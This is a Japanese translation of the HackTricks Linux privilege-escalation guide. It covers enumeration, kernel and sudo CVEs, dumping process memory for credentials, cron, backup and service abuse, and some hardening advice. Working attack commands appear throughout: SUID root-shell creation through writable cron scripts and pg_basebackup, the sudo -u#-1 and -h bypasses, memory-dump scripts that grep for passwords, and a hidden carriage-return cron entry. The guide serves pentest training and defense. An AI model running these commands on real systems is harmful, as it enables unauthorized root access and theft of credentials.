# Linux 権限昇格

{{#include ../../../banners/hacktricks-training.md}}

より幅広い背景情報や従来の列挙ワークフローについては、References に記載されている g0tmi1k、Payatu、SANS、LPE Workshop、Linux-Privilege-Escalation、linux-private-i の資料を参照してください。<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## システム情報

### OS 情報

まず、実行中の OS について情報を集めましょう。

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

**`PATH`** 変数内のいずれかのフォルダへの書き込み権限がある場合、ライブラリやバイナリを乗っ取れる可能性があります。

```bash
echo $PATH
```

### 環境情報

環境変数に興味深い情報、パスワード、または API キーはありますか？

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

kernel のバージョンを確認し、権限昇格に利用できる exploit があるか調べます。

[Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md) には、ローカル権限昇格の事例と、Binary Exploitation にある Linux kernel の詳しい解説へのリンクがまとめられています。事例を試す前に、影響を受ける build と設定を確認してください。

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

脆弱な kernel の一覧や、すでに**コンパイル済みの exploit**は、こちらで確認できます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) と [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。<sup>[[12]](#references)</sup>\
**コンパイル済みの exploit**を確認できるその他のサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)、[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトから脆弱な kernel のバージョンをすべて抽出するには、次のようにします:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

カーネル exploit の検索に役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (被害者側で実行。kernel 2.x の exploit のみをチェック)

必ず**Google でカーネルのバージョンを検索**してください。カーネルのバージョンが kernel exploit に記載されている場合があり、その exploit が有効だと確認できます。

その他の kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudoのバージョン

以下に示す脆弱なsudoのバージョンに基づく:

```bash
searchsploit sudo
```

この grep を使って、sudo のバージョンに脆弱性があるか確認できます。

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 から 1.9.17**では、sudo がユーザー制御下のディレクトリから `/etc/nsswitch.conf` を読み込む際に、非特権のローカルユーザーが `--chroot` オプションを使って root に昇格できます。上流ではこれを **1.9.17p1** で修正しました。`sudo -V` が表示するのは `PATH` で選択されたバイナリのみのため、該当するパスにある root-setuid の実行可能な sudo バイナリをすべて確認してください。ディストリビューションのパッケージでは、上流のバージョン文字列を変更せずに修正がバックポートされている場合があるため、ベンダーのパッケージ状況も確認してください。[sudo メンテナーの勧告](https://www.openwall.com/lists/oss-security/2025/06/30/3)を参照してください。<sup>[[28]](#references)[[29]](#references)</sup>

この[脆弱性](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)を悪用するための[PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)はこちらです。exploit を実行する前に、使用している `sudo` のバージョンに脆弱性があり、`chroot` 機能をサポートしていることを確認してください。  

詳細については、元の[脆弱性勧告](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)を参照してください。<sup>[[28]](#references)</sup>

### Sudo のホストベースルールのバイパス (CVE-2025-32462)

Upstream sudo **1.8.8 から 1.9.17**では、ホストベースの sudoers ルールを評価する際に、**実際のホスト名**ではなく、`sudo -h <host>` で指定された**ユーザー入力のホスト名**を使用することがあります。上流ではこれを **1.9.17p1** で修正しました。ただし、選択したホストに一致する sudoers エントリがユーザーに必要です。ローカルポリシーに加え、ベンダーのバックポートや別の sudo バイナリも確認してください。[sudo メンテナーの勧告](https://www.openwall.com/lists/oss-security/2025/06/30/2)を参照してください。<sup>[[29]](#references)</sup>

要件:
- 脆弱な sudo バージョン
- ホスト固有の sudoers ルール（ホストが現在のホスト名でも `ALL` でもないこと）

sudoers の設定例:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

許可されたホストの spoofing による exploit:

```bash
sudo -h devbox id
sudo -h devbox -i
```

選択した名前の解決が必要な場合は、そのホスト上で名前がどのように解決されるかを確認してください。ログや設定ファイルに名前が記載されているだけでは、その名前が解決可能とは限りません。また、`/etc/hosts` の変更には通常、特権付きの書き込みアクセスが必要です。

#### sudo < v1.8.28

この [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) には、`(ALL, !root) /bin/bash` のように、root を除くすべてのユーザーとしてコマンドを実行できる有効な sudo ルールが必要です。呼び出し元も、認証要件を含め、そのルールを使用できる必要があります。インストール済みパッケージのアドバイザリを確認してください。ベンダーは、表示される upstream バージョンが 1.8.28 未満のリリースにも修正をバックポートしています。`!root` ルールがあることや、バージョンが古いことだけでは、脆弱性があるとは確認できません。受動的な列挙中に、特権コマンドをテストしないでください。

```
sudo -u#-1 /bin/bash
```

### Dmesg の署名検証に失敗

この脆弱性を悪用する方法の**例**については、HTB の **smasher2 box** を確認してください。

```bash
dmesg 2>/dev/null | grep "signature"
```

### その他のシステム列挙

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## 考えられる防御策を列挙する

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

コンテナ内にいる場合は、まず以下のコンテナセキュリティのセクションを確認し、その後、runtime固有のabuseページに進んでください。


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## ドライブ

**何が、どこに、なぜマウントまたはアンマウントされているか**を確認してください。アンマウントされているものがあれば、マウントしてprivate infoがないか確認してみてください.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## 有用なソフトウェア

便利なバイナリを列挙する

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

また、**コンパイラがインストールされているか**確認してください。kernel exploitを使う必要がある場合に役立ちます。使用するマシン上（または同様の環境）でコンパイルすることが推奨されるためです。

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### インストールされている脆弱なソフトウェア

**インストールされているパッケージやサービスのバージョン**を確認してください。たとえば、権限昇格に悪用できる古いバージョンの Nagios が存在するかもしれません…\
疑わしいソフトウェアについては、バージョンを手動で確認することをおすすめします。

```bash
dpkg -l #Debian
rpm -qa #Centos
```

SSHでマシンにアクセスできる場合は、**openVAS**を使って、マシン内にインストールされている古いソフトウェアや脆弱なソフトウェアを確認することもできます。

> [!NOTE] > _これらのコマンドでは大量の情報が表示されますが、そのほとんどは役に立ちません。そのため、OpenVASなど、インストールされているソフトウェアのバージョンに既知のexploitに対する脆弱性がないか確認するアプリケーションを使うことをおすすめします_

## Processes

**どのプロセス**が実行されているかを確認し、必要以上の**権限を持つプロセス**がないか調べてください（たとえば、rootで実行されているTomcatなど）。

```bash
ps aux
ps -ef
top -n 1
```

常に実行中の [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) がないか確認してください。これを悪用して権限昇格できる可能性があります。**Linpeas** は、プロセスのコマンドラインにある `--inspect` パラメーターを確認して検出します。\
また、**プロセスのバイナリに対する自分の権限も確認してください**。他人のバイナリを上書きできるかもしれません。

### 異なるユーザー間の親子プロセスチェーン

親プロセスとは**異なるユーザー**で実行される子プロセスがあっても、それだけで悪意があるとは限りませんが、有用な**トリアージの手がかり**になります。`root` がサービスユーザーのプロセスを起動したり、ログインマネージャーがセッションプロセスを作成したりするのは想定される動作ですが、通常とは異なるチェーンからは、ラッパー、デバッグヘルパー、永続化、またはランタイムの信頼境界の弱さが見つかることがあります。

簡単な確認事項:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

意外な chain を見つけたら、親プロセスのコマンドラインと、その動作に影響するすべてのファイル（`config`、`EnvironmentFile`、helper scripts、working directory、書き込み可能な引数）を調べてください。実際の privesc path では、子プロセス自体は書き込み不可でも、**親が制御する config** や helper chain を悪用できるケースがいくつもありました。

### 削除済みの実行ファイルと、削除済みファイルを開いているプロセス

Runtime artifacts は、**削除後も**アクセスできることがよくあります。これは privilege escalation のほか、機密ファイルをすでに開いているプロセスから証拠を復元する際にも役立ちます。

削除済みの実行ファイルを確認します：

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

`/proc/<PID>/exe` が `(deleted)` を指している場合、プロセスは古いバイナリイメージをメモリ上で実行し続けています。これは調査すべき強い兆候です。理由は次のとおりです。

- 削除された実行ファイルに、興味深い文字列や認証情報が含まれている可能性がある
- 実行中のプロセスが、役立つファイルディスクリプターを公開している可能性がある
- 特権バイナリが削除されている場合、最近の改ざんや証拠隠滅の試みを示している可能性がある

削除済みで開かれているファイルをシステム全体から収集します。

```bash
lsof +L1
```

興味深い descriptor を見つけたら、直接復元します：

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

これは、プロセスが削除済みのシークレット、スクリプト、データベースのエクスポート、またはフラグファイルを開いたままの場合に特に有用です。

### プロセスの監視

[**pspy**](https://github.com/DominicBreuker/pspy) などのツールを使って、プロセスを監視できます。脆弱なプロセスが頻繁に実行されている場合や、一定の要件が満たされたときに実行される場合に、それらを特定するのに非常に役立ちます。

#### sudo 経由の Linux ProcMon

[Linux 用 ProcMon](https://github.com/microsoft/ProcMon-for-Linux) は、選択したプロセスやシステムコールをトレースし、SQLite のトレースとして保存できます。`sudo -l` で制限のない root 権限で実行可能な `procmon` コマンドが許可されている場合、他のユーザーのプロセスの入力や出力を監視できる可能性があるか検討してください。この権限は調査の手掛かりにすぎません。トレーサーの対応状況、実効ポリシー、適切なプロセスの動作状況がすべて関係します。トレースファイルにはシークレットが含まれることがあるため、許可されたエクスポートを慎重に調べ、無関係なプロセスの収集は避けてください。

### プロセスメモリ

サーバー上の一部のサービスは、**メモリ内に認証情報を平文で保存します**。\
通常、他のユーザーに属するプロセスのメモリを読み取るには**root 権限**が必要です。そのため、これはたいてい、すでに root 権限を持っていて、さらに認証情報を見つけたい場合に役立ちます。\
ただし、**一般ユーザーでも、自分が所有するプロセスのメモリは読み取れる**ことを覚えておいてください。

> [!WARNING]
> 最近のほとんどのマシンでは、デフォルトで**ptrace が許可されていません**。つまり、非特権ユーザーのプロセスであっても、他のプロセスをダンプできないことがあります。
>
> ファイル _**/proc/sys/kernel/yama/ptrace_scope**_ は ptrace のアクセス可否を制御します。
>
> - **kernel.yama.ptrace_scope = 0**: uid が同じであれば、すべてのプロセスをデバッグできます。これは ptrace が従来どおり動作する設定です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスだけがデバッグできます。
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE ケイパビリティが必要なため、管理者だけが ptrace を使用できます。
> - **kernel.yama.ptrace_scope = 3**: ptrace でトレースできるプロセスはありません。一度設定すると、再起動するまで ptrace を再び有効にできません。

短時間だけパスワード保管庫のロックを解除する同一 UID のプロセスは、別個の認証情報境界となり得ます。トレースが許可されている場合、動作中でダンプ可能なプロセスから、入力システムコールやメモリを通じて保管庫のパスワードが漏れる可能性があります。暗号化された保管庫ファイル自体が保護されていても同様です。`ptrace_scope=0` は前提条件の一つにすぎません。認証情報の一致、対象プロセスがダンプ可能かどうか、他の Linux セキュリティモジュール、プロセスの存続期間も関係します。保管庫のエントリを Unix の root ログインに使えるかどうかは、別途、認証情報の再利用を確認する必要があります。通常の列挙では、ポリシーと候補となるプロセスまたは保管庫のパスを報告し、入力を取得したりシークレットを表示したりしないでください。[kernel の Yama ドキュメント](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html)および[ptrace のアクセスチェック](https://man7.org/linux/man-pages/man2/ptrace.2.html)を参照してください。

#### GDB

たとえば FTP サービスのメモリにアクセスできる場合、その Heap を取得し、認証情報を検索できます。

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDBスクリプト

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDについて、**mapsはそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているか**を示し、**各マッピング領域の権限**も表示します。**mem**疑似ファイルは、**プロセスのメモリそのものを公開します**。**maps**ファイルから、**読み取り可能なメモリ領域**とそのオフセットがわかります。この情報を使って、**memファイル内の各領域にseekし、読み取り可能な領域をすべてファイルにダンプします**。

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` はシステムの**物理**メモリへのアクセスを提供します。仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます。\
通常、`/dev/mem` の読み取り権限は **root** と **kmem** グループのみに付与されています。

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump for linux

ProcDumpは、Windows向けSysinternalsツールスイートに含まれる従来のProcDumpツールをLinux向けに再構築したものです。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)から入手できます。

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### ツール

プロセスのメモリをダンプするには、次を使用できます。

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root 権限の要件を手動で削除し、自分が所有するプロセスをダンプできます
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) の Script A.5 (root が必要)

### プロセスメモリから取得する認証情報

#### 手動での例

authenticator プロセスが実行中であることがわかった場合：

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

プロセスを dump し（プロセスのメモリを dump するさまざまな方法については前のセクションを参照）、メモリ内の認証情報を検索できます。

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリ**や一部の**よく知られたファイル**から、平文の認証情報を**窃取**します。正常に動作させるには root 権限が必要です。

| 機能                                              | プロセス名           |
| ------------------------------------------------- | -------------------- |
| GDM パスワード（Kali デスクトップ、Debian デスクトップ） | gdm-password         |
| Gnome Keyring（Ubuntu デスクトップ、ArchLinux デスクトップ） | gnome-keyring-daemon |
| LightDM（Ubuntu デスクトップ）                    | lightdm              |
| VSFTPd（アクティブな FTP 接続）                   | vsftpd               |
| Apache2（アクティブな HTTP Basic Auth セッション） | apache2              |
| OpenSSH（アクティブな SSH セッション - Sudo の使用） | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Web「Crontab UI」パネル（alseambusher/crontab-ui）がroot権限で実行され、loopbackにのみバインドされている場合でも、SSH local port-forwarding経由でアクセスし、privileged jobを作成して権限昇格できます。<sup>[[1]](#references)[[4]](#references)</sup>

典型的な手順
- `ss -ntlp` / `curl -v localhost:8000` を使ってloopbackのみで待ち受けるポート（例: 127.0.0.1:8000）とBasic-Auth realmを特定する
- 運用アーティファクトから認証情報を探す:
  - `zip -P <password>` を含むバックアップ/スクリプト
  - `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` を公開しているsystemd unit
- Tunnelを作成してログインする:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限ジョブを作成してすぐに実行する（SUIDシェルを生成）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
使用する：
```bash
/tmp/rootshell -p   # root shell
```

ハードニング
- Crontab UI を root として実行しない。専用ユーザーを使い、権限を最小限に制限する
- localhost にバインドし、さらに firewall/VPN でアクセスを制限する。パスワードを使い回さない
- unit file に secrets を埋め込まない。secret store または root のみ読み取り可能な EnvironmentFile を使う
- オンデマンドのジョブ実行に対する audit/logging を有効にする

脆弱な scheduled job がないか確認する。root が実行するスクリプトを悪用できるかもしれない（wildcard vuln？ root が使用するファイルを変更できる？ symlink を使う？ root が使うディレクトリに特定のファイルを作成する？）。

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

`run-parts` が使用されている場合、実際に実行される名前を確認してください：

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

これは false positive を避けるためです。書き込み可能な定期実行ディレクトリが役立つのは、payload のファイル名がローカルの `run-parts` のルールに一致する場合だけです。

### Cron の PATH

たとえば、_/etc/crontab_ 内に PATH が見つかることがあります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー「user」が /home/user に対する書き込み権限を持っている点に注目してください_)

この crontab 内で root ユーザーが PATH を指定せずにコマンドやスクリプトを実行しようとした場合、たとえば: _\* \* \* \* root overwrite.sh_\
次の方法で root shell を取得できます:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### ワイルドカードを使ったスクリプトによる Cron（Wildcard Injection）

root がスクリプトを実行し、そのコマンドに「**\***」が含まれている場合、これを悪用して予期しないこと（privesc など）を引き起こせます。例：

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**ワイルドカードの前にパスが付いている場合（** _**/some/path/\***_ **）、脆弱ではありません（** _**./\***_ **も同様です）。**

ワイルドカードを悪用するその他の手法については、次のページを参照してください。


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cronログパーサーにおけるBash算術展開インジェクション

Bashの算術式では、信頼できないテキストが式として解釈されることがあります。影響を受けるBashのコンテキストでは、その式の中の配列添字によってコマンド置換が評価される場合があります。特権で動作するcronやパーサーが、攻撃者によって制御されたログテキストを算術比較に渡すと、そのパーサーの権限でコマンド置換が実行される可能性があります。<sup>[[22]](#references)</sup> これは正確なBash式とバージョンに依存します。展開された変数内の単なる `$(...)0` 文字列だけでは、再評価を確実に示すものではありません。

入力は、ファイルのメタデータや、ユーザーが書き込み可能な場所から読み込まれる別のフィールドから取得されることもあります。たとえば、特権で動作するクリーンアップスクリプトが画像の `Producer` タグを読み取り、`[[ "$producer" -eq "expected" ]]` で比較すると、変数が引用符で囲まれていても算術比較が行われます。スケジュールされた処理の実行ユーザー、タグの供給元となるファイル、比較前の変換処理、そして正確なBashの挙動を確認してください。テキストラベルには文字列比較を使い、数値には算術演算の前に入力が10進数字のみであることを検証してください。[Bashの算術規則](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html)を参照してください。

- 典型的な脆弱パターン:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- array-subscript mechanism の安全なローカル動作プローブ（特権プロセスやファイルの変更なし）:
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

実際にスケジュールされているスクリプトと、それが開くリテラルな入力パスを確認してください。ログファイル自体に書き込めなくても、sticky bit のない親ディレクトリに書き込み・移動できるユーザーは、そのディレクトリエントリを置き換えられる場合があります。権限を見分けるには `namei -l` が役立ちます。別の書き込み可能なログパス、読み取りできないスケジューラ、またはそのフィールドを Bash の算術式として評価しないパーサでは、この方法が成立するとは言えません。

### Cron スクリプトの上書きと symlink

root で実行される **cron script を変更できる**場合、非常に簡単に shell を取得できます。

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

root が実行するスクリプトで**完全なアクセス権を持つディレクトリ**が使われている場合、そのフォルダを削除し、自分が制御するスクリプトを置いた別のフォルダへの**シンボリックリンクを作成する**と有効かもしれません。

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### シンボリックリンクの検証とより安全なファイル処理

パスを指定してファイルを読み書きする、特権で実行されるスクリプトやバイナリを調査する際は、リンクがどのように処理されるかを確認してください。

- `stat()` はシンボリックリンクをたどり、リンク先のメタデータを返します。
- `lstat()` はリンク自体のメタデータを返します。
- `readlink -f` と `namei -l` を使うと、最終的なリンク先を解決し、各パス構成要素の権限を確認できます。

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

防御側や開発者が symlink trick を防ぐための、より安全なパターンには次のものがあります。

- `O_EXCL` と `O_CREAT`：パスがすでに存在する場合は失敗する（攻撃者が事前に作成したリンクやファイルをブロックする）。
- `openat()`：信頼できるディレクトリのファイルディスクリプターを基準に操作する。
- `mkstemp()`：安全な権限で一時ファイルをアトミックに作成する。

### 書き込み可能な payload を持つカスタム署名済み cron バイナリ
root の cron job が実行する正確なバイナリに一般ユーザーが書き込める場合、権限境界を越えられる可能性がありますが、カスタム署名チェックによって署名されていない置き換えを拒否できます。文書化されたケースでは、root が所有する ELF の mode は `0760` で、グループメンバーが書き込める一方、root の所有者は実行できました。表示されたプロセストレースから、job がバイナリを実行する前に `objcopy` が `.text_sig` を抽出していたことが確認できました。検証スクリプト全体は読み取り可能ではありませんでした。<sup>[[2]](#references)</sup>

成功した置き換えには、ELF signer を使い、leak した秘密署名素材で署名しました。その[フォーマットのドキュメント](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)によると、署名セクションは実行ファイルの `.text` から生成されます。証明書や一致する文字列を `.text_sig` に追加するだけで、内容が確認できない検証処理を満たせるとは示されていません。書き込み可能な署名済みバイナリが悪用可能だと結論づける前に、実際のスケジュール対象パス、有効な書き込み権限、root による実行、および検証ポリシーを確認してください。`.text_sig` セクションだけでは、調査の手がかりにすぎません。

### 頻繁に実行される cron job

プロセスを監視して、1分、2分、または5分ごとに実行されるプロセスを探せます。これを利用して権限昇格できるかもしれません。

たとえば、**1分間、0.1秒ごとに監視し**、**実行回数の少ないコマンド順に並べ**、最も多く実行されたコマンドを削除するには、次のようにします。

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**次のものも使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（開始するすべてのプロセスを監視して一覧表示します）。

### 攻撃者が設定した mode bits を保持する root backup（pg_basebackup）

root 所有の cron が、書き込み可能なデータベースディレクトリに対して `pg_basebackup`（または任意の再帰的コピー）を実行する場合、**SUID/SGID binary** を配置すると、同じ mode bits のまま **root:root** 所有としてバックアップ先に再コピーされる可能性があります。<sup>[[26]](#references)</sup>

典型的な調査手順（低権限の DB ユーザーとして）:
- `pspy` を使い、root cron が毎分 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` のようなコマンドを実行していることを確認する。
- ソースの cluster（例: `/var/lib/postgresql/14/main`）に自分が書き込めることと、ジョブ実行後に宛先（`/opt/backups/current`）が root 所有になることを確認する。

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

これは、`pg_basebackup` がクラスタのコピー時にファイルモードビットを保持するためです。root で実行すると、コピー先のファイルは **root の所有権と、攻撃者が指定した SUID/SGID** を引き継ぎます。パーミッションを保持したまま実行可能な場所に書き込む、同様の特権バックアップ／コピー処理は脆弱です。

### 見えない cron jobs

コメントの後にキャリッジリターン（改行文字なし）を置いて cronjob を作成すると、その cron job が動作します。例（キャリッジリターン文字に注意）：

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

この種の隠されたエントリを検出するには、制御文字を表示できるツールで cron ファイルを調べます。

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Services

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込めるか確認してください。書き込める場合は、サービスの**起動時**、**再起動時**、または**停止時**に**backdoorを実行**するように変更できます（マシンが再起動されるまで待つ必要があるかもしれません）。\
たとえば、.service ファイル内に **`ExecStart=/tmp/script.sh`** と記述してbackdoorを作成します。

### 書き込み可能なサービスバイナリ

